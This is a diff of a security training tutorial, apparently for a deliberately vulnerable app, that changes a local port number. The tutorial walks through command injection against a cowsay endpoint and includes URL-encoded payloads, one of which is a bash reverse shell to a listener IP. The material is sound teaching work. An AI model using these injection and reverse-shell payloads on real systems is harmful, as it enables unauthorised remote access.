@@ -17,7 +17,7 @@ The details of how these reverse shells include a bit of understanding of file r
 We have a vulnerable endpoint that uses a Linux command line utility. Let's try to execute this fun little endpoint that executes the `cowsay` program on Linux normally:
 
 ```
-$ curl 'http://localhost:8080/cowsay?input=I+Love+Linux!'
+$ curl 'http://localhost:8081/cowsay?input=I+Love+Linux!'
  _______________
 < I Love Linux! >
  ---------------
@@ -46,7 +46,7 @@ Try to exploit this command using what we've learned so far from the SQL injecti
   But there's some characters that probably won't work in a URL parameter. This is where we'll try to encode our command string with a URL encoder. We'll use https://www.urlencoder.org/ for this. If you copy the above line and encode it you can add it to the URL parameter like so and then execute the curl request to see what you get:
 
   ```
-  $ curl "http://localhost:8080/cowsay?input=input%27%3B%20ls%20%23"
+  $ curl "http://localhost:8081/cowsay?input=input%27%3B%20ls%20%23"
    _______
   < input >
    -------
@@ -89,7 +89,7 @@ Try to exploit this command using what we've learned so far from the SQL injecti
   export LISTENER_IP=$(aws --region us-west-2 ec2 describe-instances --filters  "Name=tag:Name,Values=VulnadoReverseShellReceiver" | jq -r '.Reservations[0].Instances[0]|.PublicIpAddress')
 
   # Use the URL encoded payload from above to execute a reverse shell.
-  curl "http://localhost:8080/cowsay?input=thing%27%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F${LISTENER_IP}%2F443%200%3E%261%20%23"
+  curl "http://localhost:8081/cowsay?input=thing%27%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F${LISTENER_IP}%2F443%200%3E%261%20%23"
   ```
 
   If you look back at your terminal running the listener, you should now see a prompt that looks something like:
